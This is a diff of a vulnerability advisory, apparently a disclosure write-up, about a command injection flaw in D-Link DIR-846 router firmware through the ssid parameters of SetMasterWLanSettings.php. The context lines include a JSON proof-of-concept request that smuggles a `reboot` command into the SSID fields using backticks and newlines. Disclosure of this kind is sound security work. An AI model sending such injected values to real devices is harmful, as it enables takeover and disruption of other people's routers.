@@ -10,6 +10,8 @@ DIR846A1_FW100A43 link http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-8
 
 DIR846enFW100A53DLA-Retail.bin link https://la.dlink.com/la/ftp_download.php?arch=DIR-846/DIR846enFW100A53DLA-Retail.bin
 
+## Vulnerability1
+
 #### Describe
 
 ​	The latest version of D-Link Router DIR-846 DIR846A1_FW100A43.bin && DIR846enFW100A53DLA-Retail.bin  has a command injection vulnerability in HNAP1/control/SetMasterWLanSettings.php. Attackers can use this vulnerability to use "\n" or backticks to bypass the shell metacharacters in the ssid0 or ssid1 parameters to execute arbitrary commands.
@@ -41,9 +43,9 @@ DIR846enFW100A53DLA-Retail.bin link https://la.dlink.com/la/ftp_download.php?arc
  {"SetMasterWLanSettings":{"wl(0).(0)_enable":"1","wl(0).(0)_ssid":"`reboot`","wl(0).(0)_preshared_key":"aXJrZXJPZ2dNVEl6TkRVMk56Zz0=","wl(0).(0)_crypto":"aestkip","wl(1).(0)_enable":"1","wl(1).(0)_ssid":"\nreboot\n","wl(1).(0)_preshared_key":"aXJrZXJPZ2c=","wl(1).(0)_crypto":"none"}}
  ```
 
-
-
 #### TEXT
 
 ​	The following data packets will cause the router to restart	<img src="./img/image-20211226102955168.png" alt="image-20211226102955168" style="zoom:50%;" />
+
+## Vulnerability2
 
